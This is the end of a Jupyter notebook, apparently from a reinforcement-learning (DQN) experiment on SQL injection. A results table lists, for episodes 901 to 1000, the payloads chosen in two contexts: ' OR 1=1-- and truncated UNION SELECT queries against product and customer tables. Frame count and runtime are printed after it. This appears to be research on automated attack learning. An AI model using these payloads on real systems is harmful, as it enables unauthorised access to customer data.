       "    <tr>\n",
       "      <th>Episode 955</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 956</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 957</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 958</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 959</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 960</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 961</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 962</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 963</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 964</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 965</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 966</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 967</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 968</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 969</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 970</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 971</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 972</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 973</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 974</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 975</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 976</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 977</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 978</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 979</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 980</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 981</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 982</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 983</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 984</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 985</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 986</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 987</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 988</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 989</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 990</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 991</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 992</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 993</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 994</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 995</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 996</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 997</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 998</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 999</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 1000</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                      Context 1  \\\n",
       "Episode 901   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 902   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 903   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 904                                         ' OR 1=1--    \n",
       "Episode 905                                         ' OR 1=1--    \n",
       "Episode 906   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 907   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 908                                         ' OR 1=1--    \n",
       "Episode 909   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 910                                         ' OR 1=1--    \n",
       "Episode 911                                         ' OR 1=1--    \n",
       "Episode 912                                         ' OR 1=1--    \n",
       "Episode 913   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 914   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 915   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 916   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 917   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 918                                         ' OR 1=1--    \n",
       "Episode 919   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 920   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 921   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 922   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 923   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 924   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 925                                         ' OR 1=1--    \n",
       "Episode 926                                         ' OR 1=1--    \n",
       "Episode 927   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 928                                         ' OR 1=1--    \n",
       "Episode 929                                         ' OR 1=1--    \n",
       "Episode 930                                         ' OR 1=1--    \n",
       "Episode 931                                         ' OR 1=1--    \n",
       "Episode 932                                         ' OR 1=1--    \n",
       "Episode 933   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 934   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 935                                         ' OR 1=1--    \n",
       "Episode 936   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 937                                         ' OR 1=1--    \n",
       "Episode 938   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 939   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 940   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 941   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 942   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 943                                         ' OR 1=1--    \n",
       "Episode 944                                         ' OR 1=1--    \n",
       "Episode 945                                         ' OR 1=1--    \n",
       "Episode 946                                         ' OR 1=1--    \n",
       "Episode 947                                         ' OR 1=1--    \n",
       "Episode 948   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 949                                         ' OR 1=1--    \n",
       "Episode 950   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 951   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 952                                         ' OR 1=1--    \n",
       "Episode 953                                         ' OR 1=1--    \n",
       "Episode 954   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 955   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 956   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 957   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 958   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 959   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 960   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 961                                         ' OR 1=1--    \n",
       "Episode 962                                         ' OR 1=1--    \n",
       "Episode 963   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 964   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 965                                         ' OR 1=1--    \n",
       "Episode 966                                         ' OR 1=1--    \n",
       "Episode 967                                         ' OR 1=1--    \n",
       "Episode 968                                         ' OR 1=1--    \n",
       "Episode 969                                         ' OR 1=1--    \n",
       "Episode 970   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 971                                         ' OR 1=1--    \n",
       "Episode 972                                         ' OR 1=1--    \n",
       "Episode 973                                         ' OR 1=1--    \n",
       "Episode 974                                         ' OR 1=1--    \n",
       "Episode 975                                         ' OR 1=1--    \n",
       "Episode 976                                         ' OR 1=1--    \n",
       "Episode 977   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 978   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 979   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 980                                         ' OR 1=1--    \n",
       "Episode 981   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 982   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 983   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 984   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 985                                         ' OR 1=1--    \n",
       "Episode 986                                         ' OR 1=1--    \n",
       "Episode 987   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 988                                         ' OR 1=1--    \n",
       "Episode 989                                         ' OR 1=1--    \n",
       "Episode 990                                         ' OR 1=1--    \n",
       "Episode 991                                         ' OR 1=1--    \n",
       "Episode 992   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 993                                         ' OR 1=1--    \n",
       "Episode 994   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 995   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 996   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 997   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 998   ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 999                                         ' OR 1=1--    \n",
       "Episode 1000  ' UNION SELECT product_id, product_name, brand...   \n",
       "\n",
       "                                                      Context 2  \n",
       "Episode 901                                         ' OR 1=1--   \n",
       "Episode 902                                         ' OR 1=1--   \n",
       "Episode 903   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 904   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 905                                         ' OR 1=1--   \n",
       "Episode 906   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 907   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 908                                         ' OR 1=1--   \n",
       "Episode 909   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 910                                         ' OR 1=1--   \n",
       "Episode 911   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 912   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 913   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 914                                         ' OR 1=1--   \n",
       "Episode 915                                         ' OR 1=1--   \n",
       "Episode 916   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 917   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 918   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 919   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 920                                         ' OR 1=1--   \n",
       "Episode 921                                         ' OR 1=1--   \n",
       "Episode 922   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 923                                         ' OR 1=1--   \n",
       "Episode 924   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 925                                         ' OR 1=1--   \n",
       "Episode 926   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 927                                         ' OR 1=1--   \n",
       "Episode 928   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 929   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 930   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 931                                         ' OR 1=1--   \n",
       "Episode 932                                         ' OR 1=1--   \n",
       "Episode 933   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 934   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 935   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 936   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 937   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 938                                         ' OR 1=1--   \n",
       "Episode 939                                         ' OR 1=1--   \n",
       "Episode 940                                         ' OR 1=1--   \n",
       "Episode 941   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 942                                         ' OR 1=1--   \n",
       "Episode 943                                         ' OR 1=1--   \n",
       "Episode 944   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 945   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 946   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 947   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 948                                         ' OR 1=1--   \n",
       "Episode 949   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 950                                         ' OR 1=1--   \n",
       "Episode 951                                         ' OR 1=1--   \n",
       "Episode 952                                         ' OR 1=1--   \n",
       "Episode 953   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 954   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 955                                         ' OR 1=1--   \n",
       "Episode 956                                         ' OR 1=1--   \n",
       "Episode 957                                         ' OR 1=1--   \n",
       "Episode 958   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 959                                         ' OR 1=1--   \n",
       "Episode 960                                         ' OR 1=1--   \n",
       "Episode 961                                         ' OR 1=1--   \n",
       "Episode 962   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 963   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 964                                         ' OR 1=1--   \n",
       "Episode 965   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 966   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 967                                         ' OR 1=1--   \n",
       "Episode 968                                         ' OR 1=1--   \n",
       "Episode 969   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 970                                         ' OR 1=1--   \n",
       "Episode 971                                         ' OR 1=1--   \n",
       "Episode 972   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 973   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 974   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 975   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 976   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 977   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 978   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 979   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 980   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 981                                         ' OR 1=1--   \n",
       "Episode 982                                         ' OR 1=1--   \n",
       "Episode 983                                         ' OR 1=1--   \n",
       "Episode 984                                         ' OR 1=1--   \n",
       "Episode 985                                         ' OR 1=1--   \n",
       "Episode 986                                         ' OR 1=1--   \n",
       "Episode 987                                         ' OR 1=1--   \n",
       "Episode 988                                         ' OR 1=1--   \n",
       "Episode 989                                         ' OR 1=1--   \n",
       "Episode 990   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 991   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 992   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 993                                         ' OR 1=1--   \n",
       "Episode 994   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 995   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 996                                         ' OR 1=1--   \n",
       "Episode 997   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 998                                         ' OR 1=1--   \n",
       "Episode 999   ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 1000  ' UNION SELECT customer_id, first_name, last_n...  "
      ]
     },
     "execution_count": 187,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "pd.set_option('display.max_rows', 1000)\n",
    "df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Total frame count: 751716\n"
     ]
    }
   ],
   "source": [
    "print(f'Total frame count: {frame_count}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "DQN runtime: 14058.5951146s\n"
     ]
    }
   ],
   "source": [
    "print(f'DQN runtime: {analytics.analytics_run_time/1000000000}s')"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.4 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.4"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "844694dc4390c811ac8b4d2fcaa7d18288efc8c697b009159baa2dd36f994a81"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
